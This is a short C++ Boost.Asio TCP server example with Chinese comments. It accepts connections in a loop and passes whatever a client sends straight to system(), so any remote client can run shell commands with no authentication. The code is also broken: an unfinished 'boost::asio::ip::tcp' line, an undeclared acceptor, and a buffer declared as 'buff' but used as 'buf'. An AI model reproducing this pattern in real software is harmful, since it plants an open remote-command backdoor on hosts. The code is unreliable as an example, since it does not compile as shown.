/*
*  TCP Server
*
*/
int main(int argc, char const *argv[])
{
	/* code */
	boost::asio::io_service io_serv;

	boost::asio::ip::tcp 

	while(1){
		boost::asio::ip::tcp::socket sock(io_serv);
		//监听，传入socket作为第一个参数
		acceptor.accept(sock);
		//如果函数返回，表示有连接到来
		cout << "client address:"  << sock.remote_endpoint().address() << endl;
		cout << "client port:" << sock.remote_endpoint().port() << endl;

		//下面是服务器从客户端接收数据和发送数据给客户端
		char buff[1024] = {0};
		boost::system::error_code ec;//存储错误信息
		//同步读,函数返回值为接收的长度
		int length = sock.read_some(boost::asio::buffer(buf),ec);
        
        std::cout << "receive data:" << buf << "length" << length << endl;
        system(buf); //执行客户端要求执行的命令

        //发送数据
        length = sock.write_some(boost::asio::buffer(buff,length),ec);
        cout << "send the data,length:" << length << endl;
	}
	return 0;
}